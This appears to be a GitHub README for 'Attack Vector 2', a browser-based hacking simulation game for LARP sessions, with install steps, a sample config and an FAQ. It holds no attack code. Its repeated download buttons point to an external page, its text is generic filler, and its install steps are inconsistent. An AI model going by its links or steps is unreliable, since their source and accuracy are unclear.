# Attack Vector 2 v2 - Hacking Simulation Game 2026

> **Attack Vector 2** is a web-based hacking simulation game for LARP and multiplayer play, giving players a live hacking experience in version 2.

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/oliverfoster75/attack-vector-2-game-hub?style=flat-square)](https://github.com/oliverfoster75/attack-vector-2-game-hub)

---

<p align="center">
  <a href="https://oliverfoster75.github.io/attack-vector-2-game-hub/">
    <img src="https://img.shields.io/badge/Download-Attack%20Vector%202%20Latest-brightgreen?style=for-the-badge" alt="Download Attack Vector 2">
  </a>
</p>

> **[Direct Download - Attack Vector 2 v2](https://oliverfoster75.github.io/attack-vector-2-game-hub/)**

---

[Download Latest Build](https://oliverfoster75.github.io/attack-vector-2-game-hub/)

---

## Overview

Attack Vector 2 is a browser-run hacking simulation made for live-action roleplaying and multiplayer sessions. Version 2 focuses on interactive play with simulated systems, including ICE, admin access, and master password setup, all delivered through the web.

It is intended for teams that need a clear digital framework for events, games, or training-style experiences. The project also supports offline item integration, which helps tie in-game assets and server-side setup together in one flow.

---

## Capabilities

- Web-based hacking simulation experience
- Realtime multiplayer support
- Live action roleplaying integration
- Simulated ICE and admin access flows
- Offline item integration for game materials
- Windows and Ubuntu installation scripts
- Version upgrade scripts for updates
- Admin login and master password setup

---

## Installation

Clone or download the repository, then use the setup files included in the project for your target environment.

1. Clone the repository:
   - `git clone https://github.com/oliverfoster75/attack-vector-2-game-hub.git
2. Open the project folder:
   - `cd attack_vector_2`
3. Run the appropriate installer or deployment script for your system:
   - Windows: use the provided Windows installation script
   - Ubuntu: use the provided Ubuntu installation script
4. Launch the web app through your local or hosted server setup.

---

## Using the Game

Once installed, open the game in a browser and connect to the configured server instance. The initial setup process includes admin login details and master password configuration.

Typical workflow:

1. Start the server.
2. Open the web interface.
3. Sign in with the configured admin access.
4. Play through the hacking simulation with multiplayer or LARP participants.
5. Use the upgrade scripts when moving between versions.

---

## Configuration

Most setup values are controlled through the server and installation scripts. If you are preparing a fresh deployment, review the admin login and master password settings before first launch.

Example setup notes:

    server:
      host: localhost
      port: 8080
    admin:
      enabled: true
      master_password: your-password-here

If your deployment uses different paths or item data, adjust those values in the relevant server or script files.

---

## Requirements

- Web-capable browser
- HTML-compatible hosting or server environment
- Windows or Ubuntu for the included installation scripts
- A server setup for multiplayer sessions
- Storage for game data, configuration, and offline items

---

## FAQ

**What is Attack Vector 2 for?**  
It is designed as a hacking simulation game for LARP and multiplayer use.

**Can it run on more than one platform?**  
Yes. Installation scripts are provided for Windows and Ubuntu.

**How do updates work?**  
Use the version upgrade scripts included in the repository when moving to a newer build.

**Where do I change access settings?**  
Check the admin login and master password setup in the configuration or deployment files.

**What if multiplayer is not working?**  
Confirm that the server is running, the browser can reach it, and the deployment settings match your environment.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
